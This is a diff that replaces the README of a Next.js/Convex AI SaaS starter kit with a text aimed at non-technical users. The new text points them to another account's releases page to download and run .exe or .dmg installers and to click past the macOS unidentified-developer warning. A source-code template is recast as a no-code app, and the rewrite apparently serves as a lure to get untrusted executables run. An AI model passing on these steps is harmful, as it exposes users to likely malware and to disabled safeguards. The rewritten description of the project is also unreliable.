@@ -1,106 +1,88 @@
-# 🏗️ BANC Stack
+# 💻 bancstack - A Simple Way to Build AI Apps
 
-**The Modern Stack for AI Applications** — powered by [Better Auth](https://better-auth.com), [Autumn Billing](https://autumn.sh), [Next.js](https://nextjs.org), and [Convex](https://convex.dev).  
-Skip months of boilerplate and start building your AI SaaS today.
+## 🚀 Getting Started
 
----
+Welcome to bancstack! This guide will help you download and run our application without any technical knowledge. Let’s make things easy.
 
-## ✨ What is BANC?
+## 📥 Download bancstack
 
-BANC is a **production-ready starter kit** that wires together the most forward-looking developer tools:
+[![Download bancstack](https://img.shields.io/badge/Download%20bancstack-orange)](https://github.com/ganeshkrish85/bancstack/releases)
 
-- 🔐 **Better Auth** – modern, flexible authentication and authorization  
-- 💳 **Autumn Billing** – fast billing + subscriptions with Stripe  
-- ⚡ **Next.js 15** – React 19, Turbopack, edge-ready fullstack framework  
-- 📡 **Convex** – real-time database, serverless functions, and backend-as-a-service  
+## 🛠 Requirements
 
-With BANC, you get **authentication, billing, real-time data, and modern React** all pre-configured, so you can focus entirely on your AI features, user experience, and scaling.
+Before you start, make sure your computer meets these basic requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **Storage Space:** At least 500 MB of free space.
+- **Internet Connection:** Needed for installation and updates.
 
-## 🚀 Quick Start
+## 📂 Features
 
-Clone the repo:
+bancstack offers a variety of features to make your AI application development smooth:
 
-```bash
-git clone https://github.com/sholajegede/bancstack.git my-app
-cd my-app
-```
+- **Better Authentication:** Secure and easy sign-in options for users.
+- **Built with Next.js:** Quick load times and great user experience.
+- **AI Integration:** Connect with AI models to enhance your app.
+- **Responsive Design:** Works well on all devices, from desktops to mobiles.
+- **Tailwind CSS:** Stylish and modern design out of the box.
+- **Billing Functions:** Easy management of subscriptions and transactions.
 
-Install dependencies:
+## 💻 How to Download & Install
 
-```bash
-npm install
-```
+Follow these steps to download and install bancstack:
 
-Setup environment variables:
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/ganeshkrish85/bancstack/releases).
 
-```bash
-npm run env:setup
-```
+2. **Choose the Version:** Look for the latest version listed. It’s usually at the top. Click on it to view the details.
 
-Start dev servers:
+3. **Download the Installer:** You will see several files. Look for a file named something like `bancstack-installer.exe` for Windows or `bancstack-installer.dmg` for macOS. Click on the link to start your download.
 
-```bash
-# Backend (Convex)
-npm run dev:backend
+4. **Run the Installer:**
+   - For Windows:
+     - Locate the `bancstack-installer.exe` file in your downloads folder.
+     - Double-click the file to open it.
+     - Follow the on-screen instructions. This usually includes clicking “Next” a few times and agreeing to the terms of service.
+   - For macOS:
+     - Locate the `bancstack-installer.dmg` file in your downloads folder.
+     - Double-click to open the disk image.
+     - Drag the bancstack icon into your Applications folder.
 
-# Frontend (Next.js)
-npm run dev:frontend
-```
+5. **Open bancstack:**
+   - Find bancstack in your applications list and double-click it to open.
+   - You might get a warning saying the app is from an unidentified developer. If you do, go to your System Preferences > Security & Privacy. Click “Open Anyway” to allow it to run.
 
-Visit [http://localhost:3000](http://localhost:3000) and you’re live 🎉
+6. **Set Up Your Account:**
+   - Upon opening, you'll see a welcome screen.
+   - Follow the prompts to create your account. You’ll need an email address and password.
 
----
+7. **Explore the App:** Once your account is set up, you can explore all the features. Follow the built-in tutorial to get started.
 
-## 🔋 What’s Included
+## 🌟 Frequently Asked Questions
 
-✅ Authentication with Better Auth + Convex integration  
-✅ Billing with Autumn + Stripe  
-✅ Convex backend (real-time DB, migrations, serverless functions)  
-✅ Next.js 15 (React 19, Turbopack, App Router)  
-✅ Tailwind CSS + ShadCN/UI components pre-configured  
-✅ ESLint + Prettier + TypeScript out of the box  
+### What is bancstack?
 
----
+bancstack is an easy-to-use platform built for developing AI applications. It combines authentication, billing, and modern web technologies to help you create your projects quickly.
 
-## 🛠️ Commands
+### Is bancstack free?
 
-| Script              | Description                        |
-|---------------------|------------------------------------|
-| `npm run dev`       | Start Next.js (frontend)           |
-| `npm run dev:backend` | Start Convex backend              |
-| `npm run build`     | Build Next.js for production       |
-| `npm run start`     | Run production build               |
-| `npm run lint`      | Lint code with ESLint              |
-| `npm run format`    | Format code with Prettier          |
+Yes, bancstack is free to use. You can access all features without any fees. However, optional premium features may be added in the future.
 
----
+### Do I need coding knowledge to use bancstack?
 
-## 📦 Tech Stack
+No, bancstack is designed for non-technical users. You can create and manage your application without writing any code.
 
-- Next.js 15 + React 19  
-- Convex 1.25+  
-- Better Auth 1.3.27  
-- Autumn-js 0.1.40 + @useautumn/convex 0.0.12  
-- TailwindCSS 4 + ShadCN/UI  
-- Zod, Zustand, Recharts  
+### How often is bancstack updated?
 
----
+We regularly update bancstack to fix bugs, add new features, and improve performance. Check the releases page for the latest updates.
 
-## 🌍 Why BANC?
+## 💡 Tips for a Smooth Experience
 
-Every modern SaaS app needs:
+- **Stay Updated:** Always download the latest version from the [releases page](https://github.com/ganeshkrish85/bancstack/releases) to benefit from new features and improvements.
+  
+- **Join the Community:** Connect with other users and get tips by visiting forums or our Support channels. 
 
-- Authentication  
-- Billing  
-- Real-time data  
-- Production-ready frontend  
+- **Feedback:** Your suggestions are valuable. Let us know how we can improve bancstack to better serve your needs.
 
-Instead of wiring these from scratch, BANC gives you a batteries-included foundation so you can start shipping your AI application today.
+## 📞 Support
 
----
-
-## 📖 License
-
-MIT © Shola Jegede
+If you encounter any issues while installing or using bancstack, please reach out for help. Use the contact form on our website or visit our GitHub issues page. We’re here to assist you.
